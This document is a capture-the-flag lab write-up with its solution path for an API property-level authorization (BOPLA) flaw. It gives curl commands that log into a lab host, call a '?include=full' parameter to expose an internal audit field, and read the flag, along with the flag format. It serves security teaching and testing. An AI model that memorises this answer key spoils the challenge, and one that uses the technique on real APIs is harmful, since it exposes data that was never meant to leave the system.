# api/bopla — Bopla (resource-resident, medium)

**ShipFast Orders** API. `GET /api/v1/orders` returns only your own orders with safe summary fields — object-level access is correct. The flaw is property-level (BOPLA): the same endpoint honors a client-controllable serialization switch, `?include=full`, built for internal support tooling, which adds the `internal_audit_note` property to every order object. Your own seeded order's audit note carries the flag.

Why exploitable: the API lets the client pick a response projection that includes fields never meant for API output — over-exposed properties ride along inside an otherwise properly authorized response.

## Intended path
1. `curl -s -c jar -X POST -d 'username=0xnhsec&password=vlh-tester-01' http://victim.target.lab:8119/login`
2. Safe view: `curl -s -b jar 'http://victim.target.lab:8119/api/v1/orders'` — no audit notes.
3. Over-exposed projection: `curl -s -b jar 'http://victim.target.lab:8119/api/v1/orders?include=full'` → `internal_audit_note` on your own order holds the flag.
4. (Discovery surface) public directory: `curl -s http://victim.target.lab:8119/api/v1/directory`

**Flag:** `DSLTV{API-Bopla-<9 digits>}` (in your own order's over-exposed property — not the innocent's object).
